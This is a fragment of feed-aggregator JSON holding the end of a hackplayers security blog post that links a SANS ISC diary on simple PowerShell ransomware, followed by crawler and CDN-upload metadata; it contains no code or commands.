href=\"https://1.bp.blogspot.com/-QBRwkcziWT0/YHNrFR6LirI/AAAAAAABmc8/mh5vNgq6Ax4nwThup0pWAlrB70CtSFSRACLcBGAsYHQ/s1600/powershellransom02.PNG\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"1019\" data-original-width=\"1600\" height=\"408\" src=\"https://1.bp.blogspot.com/-QBRwkcziWT0/YHNrFR6LirI/AAAAAAABmc8/mh5vNgq6Ax4nwThup0pWAlrB70CtSFSRACLcBGAsYHQ/w640-h408/powershellransom02.PNG\" width=\"640\" /></a></div><p></p><p><b>Fuente</b>: <a href=\"https://isc.sans.edu/forums/diary/Simple+Powershell+Ransomware+Creating+a+7Z+Archive+of+your+Files/27286/\">https://isc.sans.edu/forums/diary/Simple+Powershell+Ransomware+Creating+a+7Z+Archive+of+your+Files/27286/</a></p><p><br /></p>","descriptionType":"html","publishedDate":"Sun, 11 Apr 2021 21:48:00 +0000","feedId":11787,"bgimg":"https://1.bp.blogspot.com/-cw5YeiW1450/YHNq93sUA9I/AAAAAAABmc4/S0c86OJvjVM3AL0Typ_pqpSROGs2KXTqwCLcBGAsYHQ/w640-h322/powershellransom01.PNG","linkMd5":"355c31633daf9031881687d5a1291964","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn46@2020_2/2021/04/14/18-34-13-603_98ee4f6f7a8125d2.webp","destWidth":638,"destHeight":322,"sourceBytes":80605,"destBytes":24754,"author":"Vicente Motos","articleImgCdnMap":{"https://1.bp.blogspot.com/-cw5YeiW1450/YHNq93sUA9I/AAAAAAABmc4/S0c86OJvjVM3AL0Typ_pqpSROGs2KXTqwCLcBGAsYHQ/w640-h322/powershellransom01.PNG":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn46@2020_2/2021/04/14/18-34-13-603_98ee4f6f7a8125d2.webp","https://1.bp.blogspot.com/-QBRwkcziWT0/YHNrFR6LirI/AAAAAAABmc8/mh5vNgq6Ax4nwThup0pWAlrB70CtSFSRACLcBGAsYHQ/w640-h408/powershellransom02.PNG":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn49@2020_4/2021/04/14/18-34-54-303_988eeeedb1462b41.webp"},"publishedOrCreatedDate":1618425253452}],"record":{"createdTime":"2021-04-15 02:34:13","updatedTime":"2021-04-15 02:34:13","feedId":11787,"fetchDate":"Wed, 14 Apr 2021 18:34:13 +0000","fetchMs":207,"handleMs":21,"totalMs":41409,"newArticles":0,"totalArticles":25,"status":1,"type":0,"ip":"af0629e1ae74a27744b4cbd27b40a78e","hostName":"us-030*","requestId":"a4584bcb01024cfe9c4dead58d559d92_11787","contentType":"application/atom+xml; charset=UTF-8","totalBytes":80406,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":2,"articlesImgsGithubTotal":2,"successGithubMap":{"myreaderx27":1,"myreaderx32":1},"failGithubMap":{}},"feed":{"createdTime":"2020-08-25 04:37:03","updatedTime":"2020-09-05 16:26:52","id":11787,"name":"hackplayers","url":"http://www.hackplayers.com/feeds/posts/default","subscriber":262,"website":null,"icon":"https://www.hackplayers.com/favicon.ico","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx64/cdn3@2020_4/2020/09/05/08-26-50-966_c328ebeff5b0665a.ico","description":"Computer security, ethical hacking and more!","weekly":null,"link":null},"noPictureArticleList":[],"tmpCommonImgCdnBytes":24754,"tmpBodyImgCdnBytes":55652,"tmpBgImgCdnBytes":0,"extra4":{"start":1618425253211,"total":0,"statList":[{"spend":220,"msg":"获取xml内容"},{"spend":21,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":40506,"msg":"正文链接上传到cdn"}]},"extra5":2,"extra6":2,"extra7ImgCdnFailResultVector":[null],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-010.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-040.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://1.bp.blogspot.com/-cw5YeiW1450/YHNq93sUA9I/AAAAAAABmc4/S0c86OJvjVM3AL0Typ_pqpSROGs2KXTqwCLcBGAsYHQ/w640-h322/powershellransom01.PNG","sourceStatusCode":200,"destWidth":638,"destHeight":322,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn46@2020_2/2021/04/14/18-34-13-603_98ee4f6f7a8125d2.webp","sourceBytes":80605,"destBytes":24754,"targetWebpQuality":75,"feedId":11787,"totalSpendMs":519,"convertSpendMs":10,"createdTime":"2021-04-15 02:34:13","host":"europe62*","referer":"https://www.hackplayers.com/2021/04/sencillo-ransomware-en-powershell-7z.html","linkMd5ListStr":"355c31633daf9031881687d5a1291964,355c31633daf9031881687d5a1291964","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"78.7 KB","destSize":"24.2 KB","compressRate":"30.7%"},{"code":1,"isDone":false,"source":"https://1.bp.blogspot.com/-QBRwkcziWT0/YHNrFR6LirI/AAAAAAABmc8/mh5vNgq6Ax4nwThup0pWAlrB70CtSFSRACLcBGAsYHQ/w640-h408/powershellransom02.PNG","sourceStatusCode":200,"destWidth":640,"destHeight":408,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn49@2020_4/2021/04/14/18-34-54-303_988eeeedb1462b41.webp","sourceBytes":323246,"destBytes":55652,"targetWebpQuality":75,"feedId":11787,"totalSpendMs":364,"convertSpendMs":17,"createdTime":"2021-04-15 02:34:54","host":"us-010*","referer":"https://www.hackplayers.com/2021/04/sencillo-ransomware-en-powershell-7z.html","linkMd5ListStr":"355c31633daf9031881687d5a1291964","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"315.7 KB","destSize":"54.3 KB","compressRate":"17.2%"}],"successGithubMap":{"myreaderx27":1,"myreaderx32":1},"failGithubMap":{}}